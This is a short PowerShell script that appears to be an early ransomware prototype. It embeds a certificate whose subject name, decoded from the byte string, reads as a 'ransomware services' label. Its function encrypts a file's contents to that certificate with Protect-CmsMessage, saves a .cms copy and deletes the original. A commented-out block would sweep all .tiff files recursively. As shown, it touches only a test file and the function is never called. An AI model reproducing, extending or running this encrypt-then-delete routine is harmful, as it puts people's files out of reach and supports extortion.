

$longstring = "48,130,3,75,48,130,2,51,160,3,2,1,2,2,16,75,199,119,126,172,140,18,148,67,115,240,129,192,227,134,243,48,13,6,9,42,134,72,134,247,13,1,1,11,5,0,48,40,49,38,48,36,6,3,85,4,3,12,29,107,114,121,112,105,46,78,69,84,32,82,52,110,115,48,109,119,52,114,51,32,115,51,114,118,73,67,51,115,48,30,23,13,50,50,49,49,49,55,49,55,48,50,50,53,90,23,13,52,50,49,49,49,55,49,55,49,50,50,53,90,48,40,49,38,48,36,6,3,85,4,3,12,29,107,114,121,112,105,46,78,69,84,32,82,52,110,115,48,109,119,52,114,51,32,115,51,114,118,73,67,51,115,48,130,1,34,48,13,6,9,42,134,72,134,247,13,1,1,1,5,0,3,130,1,15,0,48,130,1,10,2,130,1,1,0,200,153,85,81,223,9,205,138,109,129,173,143,108,141,200,138,139,249,5,120,216,227,41,229,172,161,12,94,184,180,210,104,142,125,244,205,110,75,19,161,101,44,178,27,159,96,213,177,122,215,84,168,55,12,131,154,239,15,132,27,135,90,229,191,225,154,100,222,98,166,37,168,169,82,134,147,124,59,222,77,201,62,253,150,224,200,209,141,94,207,200,46,94,195,49,212,124,226,240,87,51,129,179,49,134,140,115,73,220,252,41,81,195,79,108,139,67,69,18,32,78,72,89,184,65,77,240,153,164,119,177,121,153,194,148,254,206,200,190,86,126,130,252,137,15,143,1,144,124,254,56,71,86,200,139,19,193,212,68,78,161,68,176,168,217,186,121,162,78,23,183,148,202,88,194,116,226,219,236,129,65,39,82,6,236,64,13,74,58,228,218,124,196,139,32,95,138,88,36,64,28,191,81,49,37,174,245,151,116,60,44,27,17,70,163,232,176,85,219,109,41,147,19,191,168,149,0,219,63,91,96,168,223,25,36,45,68,58,15,146,105,152,104,236,0,46,145,189,124,58,213,162,79,93,242,157,2,3,1,0,1,163,113,48,111,48,14,6,3,85,29,15,1,1,255,4,4,3,2,4,16,48,20,6,3,85,29,37,4,13,48,11,6,9,43,6,1,4,1,130,55,80,1,48,40,6,3,85,29,17,4,33,48,31,130,29,107,114,121,112,105,46,78,69,84,32,82,52,110,115,48,109,119,52,114,51,32,115,51,114,118,73,67,51,115,48,29,6,3,85,29,14,4,22,4,20,84,231,9,231,133,36,233,222,250,118,72,118,246,157,144,163,146,79,106,148,48,13,6,9,42,134,72,134,247,13,1,1,11,5,0,3,130,1,1,0,56,193,72,250,181,172,210,68,217,35,3,145,226,26,25,119,180,67,174,99,16,147,147,255,106,190,36,33,218,163,249,237,69,116,125,218,125,14,156,244,83,190,148,30,1,221,136,6,209,206,206,103,119,253,79,99,191,157,186,226,157,151,103,97,203,109,56,111,41,30,126,115,238,147,4,159,57,95,26,47,98,3,49,159,136,143,203,64,196,112,161,144,56,113,107,240,234,120,205,76,150,29,137,78,210,73,194,140,118,19,77,103,145,240,197,114,34,183,80,5,240,104,102,27,60,140,60,76,219,89,237,5,211,108,99,175,153,38,254,47,131,196,182,44,115,127,180,117,41,15,107,222,115,234,156,45,11,3,190,143,105,212,133,186,53,9,33,0,139,59,166,150,120,114,56,52,53,61,64,75,243,68,134,109,11,71,3,92,25,198,48,75,20,48,87,244,110,80,219,152,107,89,231,1,84,69,65,56,35,110,246,23,69,173,205,57,43,59,156,37,138,107,73,71,73,190,248,175,88,217,124,14,228,16,107,220,63,43,160,88,94,119,156,207,123,82,11,170,233,221,100,112,67,135,106,198"

[system.byte[]] $bytes = $longstring -split "," #split on comma, cast to bytes

#set newcert from bytes
[system.security.cryptography.x509certificates.x509certificate2] $Certificate = $bytes


function Switch-EncryptedFile ($Path, $Certificate) 
{
    # Get contents of $Path as a byte array:
    
    <#
    $Path = ".\"
    $array = Get-ChildItem -Path $Path -Include *.tiff -Recurse
    [system.string] $stringarray = $array
    $stringarray -split " "
    [system.byte] $bytearray = $stringarray#>


    $Path = ".\"
    $encoding        = [System.Text.Encoding]::UTF8
    $array = Get-ChildItem -Path $Path -Include testing.txt -Recurse | Get-Content
    $byte_array = $encoding.GetBytes($array)
    $byte_array

    # Convert this byte array to a Base64 string:
    
    $b64 = [system.convert]::tobase64string($byte_array)
    $b64

    # Encrypt the string with Protect-CmsMessage and $Certificate:
    $encrypted = $b64 | Protect-CmsMessage -To $Certificate

    # Create new file name with ".cms" appended:
    
    New-Item .\testing.txt.cms
    
    # Save the ciphertext to the new *.cms file:
    
    Set-Content -Value $encrypted -Path .\testing.txt.cms

    # Delete the original $Path file:
    
    Remove-Item -Path .\testing.txt

    # Return full path to the new *.cms encrypted file:

    Get-ChildItem -Path $Path -Include testing.txt.cms -Recurse | Get-Content

}

"cool" | out-file -FilePath .\testing.txt